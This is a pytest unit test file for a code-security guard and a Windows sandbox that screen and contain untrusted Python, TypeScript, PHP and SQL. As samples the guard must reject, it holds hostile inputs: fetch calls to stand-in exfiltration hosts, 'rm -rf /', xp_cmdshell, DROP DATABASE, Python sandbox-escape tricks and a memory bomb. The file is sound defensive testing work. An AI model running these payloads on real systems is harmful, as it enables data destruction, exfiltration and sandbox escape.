"""
tests/unit/test_security_sandbox.py

TDD Unit Tests for Milestone 1: Security Containment & Sandboxed Execution.
Verifies:
1. AST Taint Guard (ast_guard.py): Static analysis for Python, TypeScript, PHP, and SQL.
   - Detects and blocks filesystem mutation, shell/subprocess spawning, network exfiltration,
     and dynamic reflection escapes.
2. Windows Job Object Sandbox (windows_sandbox.py):
   - Win32 Job Object allocation limits (256 MB RAM ceiling, process count <= 2).
   - Clean execution of benign code.
   - Safe interception and termination of memory-bomb scripts without host memory exhaustion.
   - Safe termination of runaway infinite loops via timeout.
3. Polyglot Evaluation Containment:
   - Eliminates in-process exec() and intercepts malicious payloads before host execution.
"""

import os
import sys
import pytest
from pathlib import Path

# Add project root to path
ROOT = Path(__file__).resolve().parents[2]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from scripts.security.ast_guard import (
    AstSecurityGuard,
    AstSecurityReport,
    SecurityViolation,
)
from scripts.security.windows_sandbox import (
    WindowsJobSandbox,
    SandboxExecutionResult,
)


# ============================================================================
# 1. AST TAINT GUARD TESTS (Python, TypeScript, PHP, SQL)
# ============================================================================

class TestAstGuardPython:
    """Verifies static AST inspection and taint rejection for Python code."""

    def setup_method(self):
        self.guard = AstSecurityGuard()

    def test_benign_python_passes(self):
        code = """
import math
from typing import List, Tuple

def solve_buoyancy(volume: float, density: float, g: float = 9.80665) -> float:
    \"\"\"Calculates buoyant force F_b = rho * V * g.\"\"\"
    return density * volume * g

result = solve_buoyancy(2.5, 1000.0)
"""
        report = self.guard.check_python(code)
        assert report.is_safe is True
        assert len(report.violations) == 0

    def test_blocks_os_subprocess_imports(self):
        malicious_cases = [
            "import os\nos.system('dir')",
            "import subprocess\nsubprocess.run(['dir'])",
            "from subprocess import Popen, PIPE",
            "import sys\nsys.modules['os'].system('whoami')",
        ]
        for code in malicious_cases:
            report = self.guard.check_python(code)
            assert report.is_safe is False
            assert any(v.category == "forbidden_import" for v in report.violations)

    def test_blocks_filesystem_mutation(self):
        malicious_cases = [
            "open('passwords.txt', 'w').write('hacked')",
            "from pathlib import Path\nPath('data').unlink()",
        ]
        for code in malicious_cases:
            report = self.guard.check_python(code)
            assert report.is_safe is False
            assert any(v.category in ("forbidden_import", "forbidden_call") for v in report.violations)

    def test_blocks_network_sockets(self):
        malicious_cases = [
            "import socket\ns = socket.socket()",
            "import urllib.request\nurllib.request.urlopen('http://evil.com')",
            "import http.client",
        ]
        for code in malicious_cases:
            report = self.guard.check_python(code)
            assert report.is_safe is False
            assert any(v.category == "forbidden_import" for v in report.violations)

    def test_blocks_dynamic_reflection_escapes(self):
        malicious_cases = [
            "eval('1 + 1')",
            "exec('x = 2')",
            "getattr(__builtins__, 'eval')('print(1)')",
            "globals()['__builtins__']",
            "__import__('os').remove('file.txt')",
            "().__class__.__base__.__subclasses__()",
        ]
        for code in malicious_cases:
            report = self.guard.check_python(code)
            assert report.is_safe is False
            assert any(v.category in ("forbidden_call", "reflection_escape", "dunder_access") for v in report.violations)


class TestAstGuardPolyglot:
    """Verifies static security screening across TypeScript, PHP, and SQL."""

    def setup_method(self):
        self.guard = AstSecurityGuard()

    def test_typescript_blocks_fs_and_process(self):
        safe_ts = "function add(a: number, b: number): number { return a + b; }"
        unsafe_ts = "const fs = require('fs'); fs.unlinkSync('/etc/passwd');"
        unsafe_fetch = "fetch('https://evil-exfil.com/leak', {method: 'POST'});"

        assert self.guard.check_typescript(safe_ts).is_safe is True
        assert self.guard.check_typescript(unsafe_ts).is_safe is False
        assert self.guard.check_typescript(unsafe_fetch).is_safe is False

    def test_php_blocks_system_and_shell(self):
        safe_php = "<?php function square($x) { return $x * $x; } ?>"
        unsafe_php1 = "<?php system('rm -rf /'); ?>"
        unsafe_php2 = "<?php shell_exec('whoami'); ?>"
        unsafe_php3 = "<?php file_get_contents('http://evil.com'); ?>"

        assert self.guard.check_php(safe_php).is_safe is True
        assert self.guard.check_php(unsafe_php1).is_safe is False
        assert self.guard.check_php(unsafe_php2).is_safe is False
        assert self.guard.check_php(unsafe_php3).is_safe is False

    def test_sql_blocks_ddl_and_cmd_injection(self):
        safe_sql = "SELECT id, name FROM users WHERE active = 1;"
        unsafe_sql1 = "DROP DATABASE production;"
        unsafe_sql2 = "SHUTDOWN;"
        unsafe_sql3 = "EXEC xp_cmdshell('dir');"
        unsafe_sql4 = "ATTACH DATABASE 'C:/evil.db' AS evil;"

        assert self.guard.check_sql(safe_sql).is_safe is True
        assert self.guard.check_sql(unsafe_sql1).is_safe is False
        assert self.guard.check_sql(unsafe_sql2).is_safe is False
        assert self.guard.check_sql(unsafe_sql3).is_safe is False
        assert self.guard.check_sql(unsafe_sql4).is_safe is False


# ============================================================================
# 2. WINDOWS JOB OBJECT SANDBOX TESTS
# ============================================================================

class TestWindowsJobSandbox:
    """Verifies Win32 Job Object containment, resource limits, and execution safety."""

    def setup_method(self):
        self.sandbox = WindowsJobSandbox(
            max_memory_mb=256,
            timeout_seconds=5.0,
            active_process_limit=2,
        )

    def test_sandbox_initialization(self):
        """Verifies sandbox initializes with valid parameters and Win32 capabilities."""
        assert self.sandbox.max_memory_mb == 256
        assert self.sandbox.timeout_seconds == 5.0
        assert self.sandbox.active_process_limit == 2

    def test_executes_benign_python_cleanly(self):
        """Verifies clean execution of safe Python code through the Job Object."""
        script = "print('SANDBOX_OK_42')"
        result = self.sandbox.run_python_script(script)
        assert result.success is True
        assert result.exit_code == 0
        assert "SANDBOX_OK_42" in result.stdout
        assert result.timed_out is False
        assert result.memory_breached is False

    def test_kills_memory_bomb_within_256mb(self):
        """Verifies an intentional memory allocation exceeding 256 MB is contained."""
        # Allocate 350 MB: should be killed by Windows Job Object or fail safely with MemoryError
        script = """
import sys
try:
    arr = bytearray(350 * 1024 * 1024)
    print('ALLOC_SUCCEEDED')
except MemoryError:
    print('MEMORY_ERROR_CAUGHT')
    sys.exit(137)
"""
        result = self.sandbox.run_python_script(script)
        # Should NOT successfully allocate and exit cleanly with 0
        assert "ALLOC_SUCCEEDED" not in result.stdout
        assert result.success is False or result.memory_breached is True or result.exit_code != 0

    def test_kills_infinite_loop_on_timeout(self):
        """Verifies a runaway loop is safely terminated at the timeout threshold."""
        script = "while True: pass"
        fast_sandbox = WindowsJobSandbox(max_memory_mb=256, timeout_seconds=1.5)
        result = fast_sandbox.run_python_script(script)
        assert result.timed_out is True
        assert result.success is False


# ============================================================================
# 3. POLYGLOT EXECUTION CONTAINMENT TESTS
# ============================================================================

class TestPolyglotContainmentIntegration:
    """Verifies that untrusted code verification never uses in-process exec()."""

    def test_ast_guard_integration_rejects_exploit(self):
        """Verifies that an exploit payload passed to the polyglot evaluator is rejected."""
        exploit_code = """
import os
os.environ['PWNED'] = 'TRUE'
"""
        guard = AstSecurityGuard()
        report = guard.check_python(exploit_code)
        assert report.is_safe is False

        # Verify host environment was NOT modified
        assert "PWNED" not in os.environ
